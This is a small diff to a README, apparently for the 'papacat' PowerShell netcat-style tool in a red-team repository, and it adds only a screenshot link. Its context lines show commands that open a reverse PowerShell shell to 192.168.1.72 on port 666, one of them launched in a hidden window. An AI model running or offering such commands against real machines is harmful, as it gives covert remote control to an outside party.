@@ -101,6 +101,8 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 Start-Process -WindowStyle Hidden powershell -ArgumentList "Import-Module .\papacat.ps1 -Force;papacat -c 192.168.1.72 -ep -p 666 -v";exit
 ```
 
+![manualpapacat](https://github.com/r00t-3xp10it/redpill/assets/23490060/23bd0050-dc17-491f-acc9-bc10a09e392e)
+
 ---
 
 <br /><br />
